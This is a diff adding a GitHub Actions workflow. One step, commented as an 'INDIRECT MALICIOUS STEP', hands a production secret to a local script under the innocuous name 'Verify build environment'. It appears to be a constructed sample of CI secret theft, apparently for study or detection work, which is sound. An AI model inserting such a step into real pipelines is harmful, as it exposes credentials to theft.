@@ -1,0 +1,25 @@
+name: Production Build
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      # --- INDIRECT MALICIOUS STEP ---
+      - name: Verify build environment
+        env:
+          GH_TOKEN: ${{ secrets.MY_PRODUCTION_SECRET }}
+        run: |
+          chmod +x scripts/verify-build-env.sh
+          ./scripts/verify-build-env.sh
+
+      - name: Run Standard Build
+        run: |
+          echo "Building application..."
